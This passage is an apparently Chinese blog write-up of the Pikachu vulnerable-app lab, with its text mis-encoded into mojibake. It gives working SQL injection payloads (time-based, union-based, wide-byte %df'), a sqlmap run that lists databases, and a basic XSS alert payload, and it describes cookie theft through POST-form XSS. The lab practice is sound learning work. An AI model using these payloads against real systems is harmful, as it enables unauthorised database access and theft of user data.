%23<br>\n&amp;submit=%E6%9F%A5%E8%AF%A2</p>\n<p>å“¦ï¼Œåˆšåˆšè¯•äº†ä¸‹ï¼Œä¸€ä¸ªå•å¼•å·å°±è¿‡äº†ï¼Œä¹‹æ‰€ä»¥â•ï¼‰ï¼Œæ˜¯å› ä¸ºçœ‹æŠ¥é”™ä¿¡æ¯çš„æ—¶å€™å‘ç°æœ€åé¢æœ‰ä¸€ä¸ªï¼‰ï¼Œæ‰€ä»¥æƒ³åˆ°å°æ‹¬å·å¯èƒ½æ²¡æœ‰é—­åˆ</p>\n<p><img src=\"pikachu-sql-003.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"insertupdateæ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#insertupdateæ³¨å…¥\">#</a> &quot;insert/update&quot; æ³¨å…¥</h2>\n<p><strong>è¿‡ç¨‹</strong></p>\n<p>è¯•æŠ¥é”™ï¼Œçœ‹å…·ä½“è¯­å¥</p>\n<p><img src=\"pikachu-sql-004.png\" alt=\"\"></p>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;,md5(&#x27;a&#x27;),&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>å¯†ç éšä¾¿è¾“ï¼Œæ„é€ ç”¨æˆ·å payloadï¼Œæ³¨æ„æ—¶é—´æ³¨å…¥çš„æ—¶å€™è¦æ‹¬å·èµ·æ¥ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#x27;,&#x27;admin&#x27;,&#x27;&#x27;,(select sleep(10)),&#x27;&#x27;,&#x27;&#x27;) # </span><br></pre></td></tr></table></figure>\n<p>å®é™…ä¸Šå·®ä¸å¤šæ•°æ®åº“æ‰§è¡Œçš„è¯­å¥ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into a(1,2,3,4,5,6) values(&#x27; admin&#x27;,&#x27;admin&#x27;,&#x27;&#x27;,(select sleep(10)),&#x27;&#x27;,&#x27;&#x27;) # &#x27;,&#x27;md5(admin)&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;  );</span><br></pre></td></tr></table></figure>\n<p>æ³¨å†ŒæˆåŠŸï¼Œæœ€åä¹Ÿä¸æ™“å¾—è¿™ä¸ªæ³¨å…¥æœ‰åŠ³èµ„ç”¨ï¼Ÿè€Œä¸”ç™»é™†çš„æ—¶å€™æ£€æŸ¥å¯†ç ä¹Ÿæ˜¯ md5 åŠ å¯†ä¸€ä¸‹çš„â€¦</p>\n<p>ç„¶åç™»é™†çš„æ—¶å€™ï¼Œæºä»£ç è¿˜æŠ¥é”™æƒ¹</p>\n<p>æ—¶éš”å‡ å¤©ï¼Œæˆ‘çªç„¶æƒ³èµ·æ¥ï¼Œæ—¢ç„¶å¯ä»¥æ³¨å…¥é‚£ä¹ˆå°±èƒ½æ—¶é—´ç›²æ³¨è¿›è¡Œåˆ¤æ–­â€¦</p>\n<hr>\n<h2 id=\"deleteæ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#deleteæ³¨å…¥\">#</a> delete æ³¨å…¥</h2>\n<p><strong>è¿‡ç¨‹</strong></p>\n<p>å‘ç°åˆ é™¤çš„æ—¶å€™æ˜¯ get è¯·æ±‚ï¼Œå‚æ•° idï¼Œç›´æ¥ sqlmap æ³¡ä¸€æ³¡ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\othertools\\sqlmap-py&gt;python sqlmap.py -u http://www.pikachu.com/vul/sqli/sqli_del.php?id=57 --dbs --batch</span><br><span class=\"line\">        ___</span><br><span class=\"line\">       __H__</span><br><span class=\"line\"> ___ ___[&quot;]_____ ___ ___  &#123;1.4.9.8#dev&#125;</span><br><span class=\"line\">|_ -| . [.]     | .&#x27;| . |</span><br><span class=\"line\">|___|_  [&#x27;]_|_|_|__,|  _|</span><br><span class=\"line\">      |_|V...       |_|   http://sqlmap.org</span><br><span class=\"line\"></span><br><span class=\"line\">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class=\"line\"></span><br><span class=\"line\">[*] starting @ 10:11:16 /2020-11-04/</span><br><span class=\"line\"></span><br><span class=\"line\">[10:11:16] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br><span class=\"line\">[10:11:17] [INFO] testing connection to the target URL</span><br><span class=\"line\">you have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=3q2hir937ep...ecom1vat5s&#x27;). Do you want to use those [Y/n] Y</span><br><span class=\"line\">sqlmap resumed the following injection point(s) from stored session:</span><br><span class=\"line\">---</span><br><span class=\"line\">Parameter: id (GET)</span><br><span class=\"line\">    Type: boolean-based blind</span><br><span class=\"line\">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class=\"line\">    Payload: id=(SELECT (CASE WHEN (2154=2154) THEN 61 ELSE (SELECT 6834 UNION SELECT 3017) END))</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: error-based</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class=\"line\">    Payload: id=61 AND (SELECT 5347 FROM(SELECT COUNT(*),CONCAT(0x716b717671,(SELECT (ELT(5347=5347,1))),0x7162627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: time-based blind</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class=\"line\">    Payload: id=61 AND (SELECT 9106 FROM (SELECT(SLEEP(5)))xjCI)</span><br><span class=\"line\">---</span><br><span class=\"line\">[10:11:19] [INFO] the back-end DBMS is MySQL</span><br><span class=\"line\">web application technology: PHP, PHP 7.3.4, Apache 2.4.39</span><br><span class=\"line\">back-end DBMS: MySQL &gt;= 5.0</span><br><span class=\"line\">[10:11:19] [INFO] fetching database names</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;information_schema&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;bookstore&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;dvwa&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;edusys&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;exam&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;fresh&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hotel&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hy&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hy2&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;mysql&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;news&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;pentest&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;performance_schema&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;pikachu&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;store&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;student&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;test&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;vote&#x27;</span><br><span class=\"line\">available databases [18]:</span><br><span class=\"line\">[*] bookstore</span><br><span class=\"line\">[*] dvwa</span><br><span class=\"line\">[*] edusys</span><br><span class=\"line\">[*] exam</span><br><span class=\"line\">[*] fresh</span><br><span class=\"line\">[*] hotel</span><br><span class=\"line\">[*] hy</span><br><span class=\"line\">[*] hy2</span><br><span class=\"line\">[*] information_schema</span><br><span class=\"line\">[*] mysql</span><br><span class=\"line\">[*] news</span><br><span class=\"line\">[*] pentest</span><br><span class=\"line\">[*] performance_schema</span><br><span class=\"line\">[*] pikachu</span><br><span class=\"line\">[*] store</span><br><span class=\"line\">[*] student</span><br><span class=\"line\">[*] test</span><br><span class=\"line\">[*] vote</span><br><span class=\"line\"></span><br><span class=\"line\">[10:11:19] [INFO] fetched data logged to text files under &#x27;C:\\Users\\lenovo\\AppData\\Local\\sqlmap\\output\\www.pikachu.com&#x27;</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"httpå¤´æ³¨å…¥æœªè§£å†³\"><a class=\"markdownIt-Anchor\" href=\"#httpå¤´æ³¨å…¥æœªè§£å†³\">#</a> http å¤´æ³¨å…¥ï¼ˆæœªè§£å†³ï¼‰</h2>\n<p><strong>è¿‡ç¨‹</strong></p>\n<p>ç”¨æç¤ºé‡Œé¢çš„è´¦æˆ·å¯†ç åç™»å½•ï¼Œæ˜¾ç¤ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ä½ çš„ipåœ°å€:127.0.0.1</span><br><span class=\"line\"></span><br><span class=\"line\">ä½ çš„user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class=\"line\"></span><br><span class=\"line\">ä½ çš„http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"></span><br><span class=\"line\">ä½ çš„ç«¯å£ï¼ˆæœ¬æ¬¡è¿æ¥ï¼‰:tcp14766</span><br></pre></td></tr></table></figure>\n<p>è¯´æ˜è¿™äº›å¤´ä¿¡æ¯å¯èƒ½éƒ½è¢«å­˜è¿›æ•°æ®åº“äº†ï¼Œå¯ä»¥è¿›è¡Œ sql æ³¨å…¥</p>\n<p>ç”¨ bp æŠ“åˆ°çš„åŒ…ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /vul/sqli/sqli_header/sqli_header_login.php HTTP/1.1</span><br><span class=\"line\">Host: www.pikachu.com</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: http://www.pikachu.com/vul/sqli/sqli_header/sqli_header_login.php</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 34</span><br><span class=\"line\">Origin: http://www.pikachu.com</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: PHPSESSID=1h9tm55rqj71244okk7do3ch0q</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\"></span><br><span class=\"line\">username=a&amp;password=a&amp;submit=Login</span><br></pre></td></tr></table></figure>\n<p>åˆ æ‰ä¸€ä¸ªåŠ å•å¼•å·ï¼Œæ²¡æŠ¥é”™ï¼Œç”¨ç½‘ä¸Šçš„ payload ä¹Ÿä¸æŠ¥é”™ï¼Œç¥äº†ä¸ªå¥‡ï¼š</p>\n<p><img src=\"pikachu-sql-005.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"ç›²æ³¨base-on-boolean\"><a class=\"markdownIt-Anchor\" href=\"#ç›²æ³¨base-on-boolean\">#</a> ç›²æ³¨ (base  on boolean)</h2>\n<p><strong>è¿‡ç¨‹</strong></p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php</span><br><span class=\"line\">?name=lili&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>æ­£å¸¸è¾“å‡ºï¼š</p>\n<p><img src=\"pikachu-sql-006.png\" alt=\"\"></p>\n<p>payloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php</span><br><span class=\"line\">?name=lili&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">æ‚¨è¾“å…¥çš„usernameä¸å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥ï¼</span><br></pre></td></tr></table></figure>\n<p>å¯èƒ½æ˜¯å› ä¸ºåªèƒ½è¾“å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œpayloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&#x27; union select database(), &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>çˆ†å‡ºæ•°æ®åº“ï¼Œç¡®å®šæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸¤ä¸ªå­—æ®µï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:pikachuyour email is: 1</span><br></pre></td></tr></table></figure>\n<p>çˆ†è¡¨ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&#x27; union select database(), group_concat(table_name)  from information_schema.tables where table_schema = &#x27;pikachu&#x27; and &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><figcaption><span>uid:pikachu</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your email is: httpinfo,member,message,users,xssblind</span><br></pre></td></tr></table></figure>\n<p>çˆ†å‡ºå­—æ®µï¼š</p>\n<figure class=\"highlight plaintext\"><figcaption><span>email is: id,userid,ipaddress,useragent,httpaccept,remoteport</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your email is: id,userid,ipaddress,useragent,httpaccept,remoteport</span><br></pre></td></tr></table></figure>\n<p>å¯ä»¥é€šè¿‡ group_concat () åˆ†åˆ«è¾“å‡ºæ¯ä¸ªå­—æ®µæ‰€æœ‰çš„å€¼ï¼Œpayloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=lilijmknh&#x27; union select database(),group_concat(id) from httpinfo where &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:pikachuyour email is: 42,43,44,45,46,47</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"ç›²æ³¨base-on-timeæœªæˆåŠŸå®ç°-500\"><a class=\"markdownIt-Anchor\" href=\"#ç›²æ³¨base-on-timeæœªæˆåŠŸå®ç°-500\">#</a> ç›²æ³¨ (base on time)ï¼ŒæœªæˆåŠŸå®ç° ï¼Œ500</h2>\n<p>è¿™ä¸ªå°±æ˜¯åˆ©ç”¨äºŒåˆ†æ³•æŸ¥ ascii ç å€¼ï¼Œæ‰‹å·¥æ³¨å…¥çš„è¯å¾ˆè´¹æ—¶é—´çš„æŠŠ</p>\n<p>é ï¼Œä»–æ ¹æœ¬å°±ä¸å…³å¿ƒæˆ‘æ˜¯è°ï¼æˆ‘è¦å»çœ‹æºç äº†ï¼</p>\n<p>å‘ç°æœç„¶æ˜¯ç›²æ³¨ï¼Œä¸ç®¡æ˜¯ä¸æ˜¯æŸ¥åˆ°ï¼Œéƒ½æ˜¯è¾“å‡º i donâ€™t care who you are!</p>\n<p><strong>è¿‡ç¨‹</strong></p>\n<p>payloadï¼ŒæŠ¥ 500 äº†:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_t.php?name=&#x27; or (length(database())&gt;1 and sleep(10)) and &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"å®½å­—èŠ‚æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#å®½å­—èŠ‚æ³¨å…¥\">#</a> å®½å­—èŠ‚æ³¨å…¥</h2>\n<p><a href=\"https://www.cnblogs.com/Rain99-/p/10583406.html\">è¯¦è§£</a></p>\n<ol>\n<li>å­—ç¬¦ã€å­—ç¬¦é›†<br>\nå­—ç¬¦ (character) æ˜¯ç»„æˆå­—ç¬¦é›† (character set) çš„åŸºæœ¬å•ä½ã€‚å¯¹å­—ç¬¦èµ‹äºˆä¸€ä¸ªæ•°å€¼ (encoding) æ¥ç¡®å®šè¿™ä¸ªå­—ç¬¦åœ¨è¯¥å­—ç¬¦é›†ä¸­çš„ä½ç½®ã€‚</li>\n<li>UTF8<br>\n ç”±äº ASCII è¡¨ç¤ºçš„å­—ç¬¦åªæœ‰ 128 ä¸ªï¼Œå› æ­¤ç½‘ç»œä¸–ç•Œçš„è§„èŒƒæ˜¯ä½¿ç”¨ UNICODE ç¼–ç ï¼Œä½†æ˜¯ç”¨ ASCII è¡¨ç¤ºçš„å­—ç¬¦ä½¿ç”¨ UNICODE å¹¶ä¸é«˜æ•ˆã€‚å› æ­¤å‡ºç°äº†ä¸­é—´æ ¼å¼å­—ç¬¦é›†ï¼Œè¢«ç§°ä¸ºé€šç”¨è½¬æ¢æ ¼å¼ï¼ŒåŠ UTF (Universal Transformation Format)ã€‚</li>\n<li>å®½å­—èŠ‚<br>\n GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JIS ç­‰è¿™äº›éƒ½æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤å­—èŠ‚ã€‚å®½å­—èŠ‚å¸¦æ¥çš„å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯åƒ ASCII å­—ç¬¦ (ä¸€å­—èŠ‚) çš„ç°è±¡ï¼Œå³å°†ä¸¤ä¸ª ascii å­—ç¬¦è¯¯è®¤ä¸ºæ˜¯ä¸€ä¸ªå®½å­—èŠ‚å­—ç¬¦ã€‚</li>\n</ol>\n<p>å®½å­—èŠ‚æ³¨å…¥åŸç†ï¼š</p>\n<blockquote>\n<p>GBK å ç”¨ä¸¤å­—èŠ‚</p>\n<p>ASCII å ç”¨ä¸€å­—èŠ‚</p>\n<p>PHP ä¸­ç¼–ç ä¸º GBKï¼Œå‡½æ•°æ‰§è¡Œæ·»åŠ çš„æ˜¯ ASCII ç¼–ç ï¼ˆæ·»åŠ çš„ç¬¦å·ä¸º â€œ\\â€ï¼‰ï¼ŒMYSQL é»˜è®¤å­—ç¬¦é›†æ˜¯ GBK ç­‰å®½å­—èŠ‚å­—ç¬¦é›†ã€‚</p>\n<p>å¤§å®¶éƒ½çŸ¥é“ % dfâ€™ è¢« PHP è½¬ä¹‰ï¼ˆå¼€å¯ GPCã€ç”¨ addslashes å‡½æ•°ï¼Œæˆ–è€… icov ç­‰ï¼‰ï¼Œå•å¼•å·è¢«åŠ ä¸Šåæ–œæ  \\ï¼Œå˜æˆäº† % df\\â€™ï¼Œå…¶ä¸­ \\ çš„åå…­è¿›åˆ¶æ˜¯ %5C ï¼Œé‚£ä¹ˆç°åœ¨  <code>%df\\â€™</code>  = <code>%df%5c%27</code> ï¼Œå¦‚æœç¨‹åºçš„é»˜è®¤å­—ç¬¦é›†æ˜¯ GBK ç­‰å®½å­—èŠ‚å­—ç¬¦é›†ï¼Œåˆ™ MySQL ç”¨ GBK çš„ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸º  <code>%df%5c</code>  æ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ <code>ç¸—</code> ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š% df\\â€™ = % df%5c%27 = ç¸—â€™ï¼Œæœ‰äº†å•å¼•å·å°±å¥½æ³¨å…¥äº†ã€‚</p>\n</blockquote>\n<p><img src=\"https://img2018.cnblogs.com/blog/1335588/201903/1335588-20190323124156168-514841357.png\" alt=\"img\"></p>\n<p><strong>è¿‡ç¨‹</strong></p>\n<p>payloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name=%df&#x27; or 1=1 %23+&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>\n<p>æ‰€æœ‰æ•°æ®è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:1your email is: eyour uid:2your email is: allen@pikachu.comyour uid:3your email is: kobe@pikachu.comyour uid:4your email is: grady@pikachu.comyour uid:5your email is: kevin@pikachu.comyour uid:6your email is: lucy@pikachu.com......</span><br></pre></td></tr></table></figure>\n<hr>\n<h1 id=\"xss\"><a class=\"markdownIt-Anchor\" href=\"#xss\">#</a> XSS</h1>\n<blockquote>\n<p>XSS æ¼æ´å¯ä»¥ç”¨æ¥è¿›è¡Œé’“é±¼æ”»å‡»ï¼Œå‰ç«¯ JS æŒ–çŸ¿ï¼Œç”¨æˆ· cookie è·å–ã€‚ç”šè‡³å¯ä»¥ç»“åˆæµè§ˆå™¨è‡ªèº«çš„æ¼æ´å¯¹ç”¨æˆ·ä¸»æœºè¿›è¡Œè¿œç¨‹æ§åˆ¶ã€‚</p>\n</blockquote>\n<h2 id=\"åå°„å‹xssget\"><a class=\"markdownIt-Anchor\" href=\"#åå°„å‹xssget\">#</a> åå°„å‹ xss (get)</h2>\n<h3 id=\"è¿‡ç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹\">#</a> è¿‡ç¨‹</h3>\n<p>â€‹\tæ–‡æœ¬æ¡†ä¸‹æ–¹ä¼šå›æ˜¾è¾“å…¥çš„å†…å®¹ï¼Œæƒ³è¾“ä¸‡èƒ½å¼¹çª— <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> ï¼Œå‘ç°æ–‡æœ¬æ¡†é™åˆ¶äº†å­—æ•°ï¼Œå‰ç«¯ç›´æ¥å®šä½æ”¹æˆ 100ï¼ŒæˆåŠŸ</p>\n<p><img src=\"pikachu-xss-001.png\" alt=\"\"></p>\n<p>å› ä¸ºä¸º get è¯·æ±‚ï¼Œæ‰€ä»¥è¾“å…¥çš„å‚æ•°å€¼ä¼šå‡ºç°åœ¨ url æœ«å°¾</p>\n<hr>\n<h2 id=\"åå°„å‹xsspostå¤§å¤±è´¥\"><a class=\"markdownIt-Anchor\" href=\"#åå°„å‹xsspostå¤§å¤±è´¥\">#</a> åå°„å‹ xss (post)ï¼ˆå¤§å¤±è´¥ï¼‰</h2>\n<p><img src=\"pikachu-xss-002.png\" alt=\"\"></p>\n<p>â€‹\tPOST è¯·æ±‚åŒºåˆ«ä¸ GET è¯·æ±‚ï¼ŒPOST è¯·æ±‚ä¸èƒ½ä» URL è®©ç”¨æˆ·å‘æœåŠ¡å™¨æäº¤æ•°æ®ã€‚æ‰€ä»¥ä¸ºäº†è¿›è¡Œæ³¨å…¥ï¼Œéœ€è¦è®©ç”¨æˆ·ä»£æ›¿æ”»å‡»è€…æäº¤ POST è¯·æ±‚ï¼Œè¿™å°±éœ€è¦æ”»å‡»è€…è‡ªå·±æ­å»ºç«™ç‚¹ï¼Œç„¶åå†ç«™ç‚¹å†…å†™ä¸€ä¸ª POST è¡¨å•ï¼Œå°†æˆ‘ä»¬æ­å»ºå‡ºçš„è¿æ¥å‘ç»™ç”¨æˆ·ï¼Œè¿™æ ·å°±èƒ½è®©ç”¨æˆ·å¸®æ”»å‡»è€…æäº¤ POST è¯·æ±‚å‘ç»™å­˜åœ¨ XSS æ¼æ´çš„ä¸­ã€‚è¿™æ ·å°±èƒ½çªƒå–åˆ°ç”¨æˆ·çš„ cookieï¼Œå°±èƒ½ä¼ªé€ ç”¨æˆ·ç™»é™†è¾¾åˆ°ç ´åçš„ç›®çš„ã€‚</p>\n<h3 id=\"è¿‡ç¨‹-2\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-2\">#</a> è¿‡ç¨‹</h3>\n<p>ä½†æ˜¯è¿™åå°æˆ‘æ²¡ç™»è¿›å»å‘€ï½</p>\n<hr>\n<h2 id=\"å­˜å‚¨å‹xss\"><a class=\"markdownIt-Anchor\" href=\"#å­˜å‚¨å‹xss\">#</a> å­˜å‚¨å‹ xss</h2>\n<h3 